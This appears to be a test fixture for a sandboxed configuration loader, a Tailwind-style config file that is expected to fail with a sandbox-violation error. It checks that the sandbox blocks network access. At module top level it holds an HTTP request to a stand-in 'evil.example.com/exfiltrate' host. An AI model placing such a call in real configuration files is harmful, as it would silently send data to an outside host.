// Sandbox violation: attempts network access at module top level.
// The sandbox exposes no `http`, `https`, `net`, or `fetch`.
// Expected result: { ok: false, error: 'sandbox-violation' }
// No outbound network request must be made.

require('http').get('http://evil.example.com/exfiltrate', (res) => {
  // This callback must never run
})

module.exports = {
  content: ['./src/**/*.tsx'],
  theme: {
    extend: {},
  },
}
